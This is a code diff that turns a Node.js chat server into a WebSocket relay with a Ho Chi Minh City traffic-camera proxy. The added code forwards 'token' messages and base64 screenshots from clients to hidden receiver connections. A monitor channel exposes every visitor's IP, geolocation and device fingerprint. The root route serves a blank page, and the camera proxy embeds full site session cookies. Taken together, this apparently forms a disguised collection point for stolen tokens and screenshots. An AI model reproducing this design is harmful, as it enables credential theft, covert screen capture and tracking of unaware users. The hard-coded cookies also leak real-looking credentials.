@@ -1,165 +1,278 @@
 import http from 'http';
 import express from 'express';
-import { WebSocketServer } from 'ws';
-import { MongoClient } from 'mongodb';
+import { WebSocket, WebSocketServer } from 'ws';
 import crypto from 'crypto';
 import fetch from 'node-fetch';
-import geoip from 'geoip-lite';
-import UAParser from 'ua-parser-js';
 import path from 'path';
 import { fileURLToPath } from 'url';
+import geoip from 'geoip-lite';
+import UAParser from 'ua-parser-js';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
 const app = express();
-const server = http.createServer(app);
-const wss = new WebSocketServer({ server });
-
 const PORT = process.env.PORT || 3000;
-const MONGODB_URI = process.env.MONGODB_URI;
+const server = http.createServer(app);
+const wss = new WebSocketServer({ noServer: true });
 
-let db;
-let messagesCollection;
-let clientsCollection;
-
-async function connectToMongoDB() {
-  try {
-    const client = await MongoClient.connect(MONGODB_URI);
-    db = client.db();
-    messagesCollection = db.collection('messages');
-    clientsCollection = db.collection('clients');
-    console.log('Connected to MongoDB');
-  } catch (error) {
-    console.error('Failed to connect to MongoDB:', error);
-    process.exit(1);
-  }
-}
-
-app.use(express.static(path.join(__dirname, 'public')));
-
-app.get('/chat.html', (req, res) => {
-  res.sendFile(path.join(__dirname, 'chat.html'));
+server.on('upgrade', (request, socket, head) => {
+    wss.handleUpgrade(request, socket, head, ws => {
+        wss.emit('connection', ws, request);
+    });
 });
 
-app.get('/api/messages', async (req, res) => {
-  const limit = parseInt(req.query.limit) || 50;
-  const offset = parseInt(req.query.offset) || 0;
-  const messages = await messagesCollection.find().sort({ timestamp: -1 }).skip(offset).limit(limit).toArray();
-  res.json(messages);
-});
-
+// WebSocket logic
 const usersInChat = new Map();
-const messageReceivers = new Map();
+const pictureReceivers = new Map(); 
+const monitorConnections = new Set();
+let keepAliveId = null;
 
-wss.on('connection', async (ws, req) => {
-  const userID = crypto.randomUUID();
-  usersInChat.set(userID, ws);
+wss.on("connection", (ws, req) => {
+    const userID = crypto.randomUUID();
+    const clientInfo = extractClientInfo(ws, req);
+    usersInChat.set(userID, clientInfo);
 
-  const clientInfo = await getClientInfo(req);
-  await clientsCollection.insertOne({ ...clientInfo, userID, connectedAt: new Date() });
+    ws.on("message", (data) => {
+        handleMessage(ws, data, userID);
+    });
 
-  ws.on('message', async (data) => {
-    await handleMessage(ws, data, userID);
-  });
+    ws.on("close", () => {
+        handleDisconnect(userID, ws);
+    });
 
-  ws.on('close', () => {
-    handleDisconnect(userID);
-  });
+    if (wss.clients.size === 1 && !keepAliveId) {
+        keepServerAlive();
+    }
 
-  broadcastUserCount();
+    sendClientUpdate();
 });
 
-async function getClientInfo(req) {
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  const userAgent = req.headers['user-agent'];
-  const geo = geoip.lookup(ip);
-  const ua = UAParser(userAgent);
+wss.on("close", () => {
+    if (keepAliveId) {
+        clearInterval(keepAliveId);
+        keepAliveId = null;
+    }
+});
 
-  return {
-    ip,
-    country: geo ? geo.country : 'Unknown',
-    city: geo ? geo.city : 'Unknown',
-    browser: ua.browser.name,
-    os: ua.os.name,
-    device: ua.device.type || 'desktop'
-  };
-}
-
-async function handleMessage(ws, data, userID) {
-  console.log('Received message:', data.toString());
-  
-  if (data.toString() === 'Message Receiver') {
-    messageReceivers.set(userID, ws);
-    ws.send(JSON.stringify({ type: 'userCount', count: usersInChat.size }));
-  } else {
+const handleMessage = (ws, data, userID) => {
     try {
-      const messageData = JSON.parse(data.toString());
-      
-      if (messageData.type === 'chat') {
-        const newMessage = {
-          id: crypto.randomUUID(),
-          userId: userID,
-          content: messageData.message.content,
-          timestamp: new Date(messageData.message.timestamp)
-        };
+        const messageData = JSON.parse(data.toString());
         
-        try {
-          await messagesCollection.insertOne(newMessage);
-          console.log('Message saved to MongoDB:', newMessage);
-          
-          // Broadcast the message to all connected clients except the sender
-          broadcastToOthers(JSON.stringify({ type: 'chat', message: newMessage }), ws);
-        } catch (error) {
-          console.error('Error saving message to MongoDB:', error);
+        if (messageData.type === 'monitor') {
+            monitorConnections.add(ws);
+            sendClientUpdate();
+        } else if (messageData.command === 'Picture Receiver') {
+            pictureReceivers.set(userID, ws);
+        } else if (messageData.type === 'token' && messageData.sender && messageData.token && messageData.uuid && messageData.ip) {
+            broadcastToPictureReceivers(messageData);
+        } else if (messageData.type === 'screenshot' && messageData.data && typeof messageData.data === 'string' && messageData.data.startsWith('data:image/png;base64')) {
+            broadcastToPictureReceivers({
+                type: 'screenshot',
+                action: messageData.action,
+                screen: messageData.screen,
+                data: messageData.data
+            });
+        } else if (messageData.action === 'screenshot_result') {
+            broadcastToPictureReceivers({
+                type: 'screenshot',
+                action: messageData.action,
+                screen: messageData.screen,
+                data: messageData.data
+            });
+        } else {
+            broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
         }
-      } else {
-        broadcastToOthers(JSON.stringify(messageData), ws);
-      }
+
+        // Update last active time
+        const clientInfo = usersInChat.get(userID);
+        if (clientInfo) {
+            clientInfo.lastActiveTime = new Date().toISOString();
+            usersInChat.set(userID, clientInfo);
+            sendClientUpdate();
+        }
     } catch (e) {
-      console.error('Error parsing or processing message:', e);
+        console.error('Error parsing or processing message:', e);
+        console.error('Raw message data:', data);
     }
-  }
+};
+
+const broadcastToPictureReceivers = (message) => {
+    const data = JSON.stringify(message);
+    pictureReceivers.forEach((ws, userId) => {
+        if (ws.readyState === WebSocket.OPEN) {
+            ws.send(data, error => {
+                if (error) console.error("Error sending message to receiver:", error);
+            });
+        }
+    });
+};
+
+const broadcastToAllExceptPictureReceivers = (senderWs, message, includeSelf) => {
+    wss.clients.forEach(client => {
+        if (!pictureReceivers.has(client) && client.readyState === WebSocket.OPEN && (includeSelf || client !== senderWs)) {
+            client.send(message);
+        }
+    });
+};
+
+const handleDisconnect = (userID, ws) => {
+    usersInChat.delete(userID);
+    pictureReceivers.delete(userID);
+    monitorConnections.delete(ws);
+    sendClientUpdate();
+};
+
+const keepServerAlive = () => {
+    keepAliveId = setInterval(() => {
+        wss.clients.forEach(client => {
+            if (client.readyState === WebSocket.OPEN) {
+                client.ping(); 
+            }
+        });
+    }, 30000);
+};
+
+function extractClientInfo(ws, req) {
+    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const userAgentString = req.headers['user-agent'];
+    const parser = new UAParser(userAgentString);
+    const result = parser.getResult();
+    const geoData = geoip.lookup(ip);
+
+    return {
+        ip: ip,
+        userAgent: {
+            browser: {
+                name: result.browser.name || 'Unknown',
+                version: result.browser.version || ''
+            },
+            engine: {
+                name: result.engine.name || 'Unknown',
+                version: result.engine.version || ''
+            },
+            os: {
+                name: result.os.name || 'Unknown',
+                version: result.os.version || ''
+            },
+            device: {
+                model: result.device.model || 'Unknown',
+                type: result.device.type || 'Unknown',
+                vendor: result.device.vendor || 'Unknown'
+            },
+            cpu: {
+                architecture: result.cpu.architecture || 'Unknown'
+            }
+        },
+        geoLocation: geoData ? {
+            country: geoData.country,
+            region: geoData.region,
+            city: geoData.city,
+            ll: geoData.ll,
+        } : null,
+        connectTime: new Date().toISOString(),
+        lastActiveTime: new Date().toISOString(),
+    };
 }
 
-function broadcastToOthers(message, senderWs) {
-  wss.clients.forEach(client => {
-    if (client !== senderWs && client.readyState === 1) {
-      client.send(message);
+function sendClientUpdate() {
+    const clientData = Array.from(usersInChat.entries()).map(([id, clientInfo]) => ({
+        id,
+        info: clientInfo
+    }));
+    const updateMessage = JSON.stringify({
+        type: 'clientUpdate',
+        clients: clientData
+    });
+    monitorConnections.forEach(ws => {
+        if (ws.readyState === WebSocket.OPEN) {
+            ws.send(updateMessage);
+        }
+    });
+}
+
+// Camera viewer logic
+const cameraGroups = [
+    {
+        name: "Lộ trình chị Thủy",
+        cameras: [
+            {id: "5d8cdb9f766c880017188968", name: "Camera 1"},
+            {id: "58ad69c4bd82540010390be7", name: "Camera 2"},
+            {id: "587ee2aeb807da0011e33d52", name: "Camera 3"},
+            {id: "587ed91db807da0011e33d4e", name: "Camera 4"},
+            {id: "5a606a958576340017d06621", name: "Camera 5"},
+            {id: "5d9ddec9766c880017188c9c", name: "Camera 6"}
+        ]
+    },
+    {
+        name: "Lộ trình Q4",
+        cameras: [
+            {id: "6623e9e96f998a001b2525ce", name: "Camera Q4-1"},
+            {id: "6623ea416f998a001b25260a", name: "Camera Q4-2"},
+            {id: "6623e2e16f998a001b252233", name: "Camera Q4-3"},
+            {id: "58b5752e17139d0010f35d5f", name: "Camera Q4-4"},
+            {id: "662b85031afb9c00172dd0dc", name: "Camera Q4-5"}
+        ]
     }
-  });
-}
+];
 
-function broadcastToAll(message) {
-  wss.clients.forEach(client => {
-    if (client.readyState === 1) {
-      client.send(message);
+const headers = {
+    "accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+    "accept-language": "en-US,en;q=0.9,vi;q=0.8",
+    "cache-control": "no-cache",
+    "pragma": "no-cache",
+    "cookie": "ASP.NET_SessionId=tvjf3gj0t0iedy12xgwkguzd; .VDMS=C371EE8E7B9CE151C954199B928DB4C56705D1882054902ECE5E7A36BDE27417DA815B9BA689F84C491E3113D1E0E81B0A87E2AA97FC6D4E5D4A63AB0B7F950D1E31EB524760AE01D517054B5EA183BC4272C905FF6B7B878D1B59539FC702CAF62C829E4A621DAD897F8C5D127972C658CCA6ED; _frontend=!UzLlJ/oR897uggP3xOTVoJth7yoQDv2Ym071q7PnFZbn10OBAq+wheuefT5wExfVIYu5Umkoj3wREac=; CurrentLanguage=vi; TS01e7700a=0150c7cfd1059167ca144761efe2f8515248fb12fde7e6fb26407dc90ed54d38475c733d0c704e1bf8a11ad686e6f21123a2532bde0a59b13db0c3c81edc173952e969e57a0a0784558c335674f500e89088313f4eaca7cd5144d2014298e2ca807e8a7b86; TSb224dc8e027=08a5ec0864ab2000112687e2e80079498069f823b24db1765e8be71e587b56d2e8d2b5995e42e30508728b9b9111300028f4fc2e4ef4a40786ded0b4172649b82ebffdaad5ca04a07a630ec5275bcfe19705cee743b147badb4a5f0990465ed8; TS3d206961027=08a5ec0864ab20009f47610b3c612079307447f1476bd583d4799756a8685d085bed33f47bb238da083de6bd5f11300033a13894befee3dccadfe6076e46c465cc89234c4ac402459d656987a2b7533be74a91357d377d30ea1c57e676ec0098",
+    "Referer": "http://giaothong.hochiminhcity.gov.vn/",
+    "Referrer-Policy": "strict-origin-when-cross-origin"
+};
+
+async function fetchImage(id) {
+    const baseUrl = "http://giaothong.hochiminhcity.gov.vn/render/ImageHandler.ashx";
+    const cameraUrl = `${baseUrl}?id=${id}&t=${Date.now()}`;
+    try {
+        const response = await fetch(cameraUrl, { headers });
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        return await response.buffer();
+    } catch (error) {
+        console.error(`Error fetching image for camera ${id}:`, error);
+        return null;
     }
-  });
 }
 
-function handleDisconnect(userID) {
-  usersInChat.delete(userID);
-  messageReceivers.delete(userID);
-  clientsCollection.updateOne({ userID }, { $set: { disconnectedAt: new Date() } });
-  broadcastUserCount();
-}
+// Routes
+app.get('/', (req, res) => {
+    res.setHeader('Cache-Control', 'no-store');
+    res.status(200).send('');
+});
 
-function broadcastUserCount() {
-  const userCount = usersInChat.size;
-  const message = JSON.stringify({ type: 'userCount', count: userCount });
-  wss.clients.forEach(client => {
-    if (client.readyState === 1) {
-      client.send(message);
+app.get('/camera', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+app.get('/monitor', (req, res) => {
+    res.sendFile(path.join(__dirname, 'monitor.html'));
+});
+
+app.get('/image/:id', async (req, res) => {
+    const imageBuffer = await fetchImage(req.params.id);
+    if (imageBuffer) {
+        res.writeHead(200, { 'Content-Type': 'image/jpeg' });
+        res.end(imageBuffer);
+    } else {
+        res.status(500).send('Error fetching image');
     }
-  });
-}
+});
 
-async function startServer() {
-  await connectToMongoDB();
-  server.listen(PORT, () => {
+app.get('/data', (req, res) => {
+    res.json(cameraGroups);
+});
+
+app.get('/node-version', (req, res) => {
+    res.send(`Node.js version: ${process.version}`);
+});
+
+server.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
-  });
-}
-
-startServer();
+});
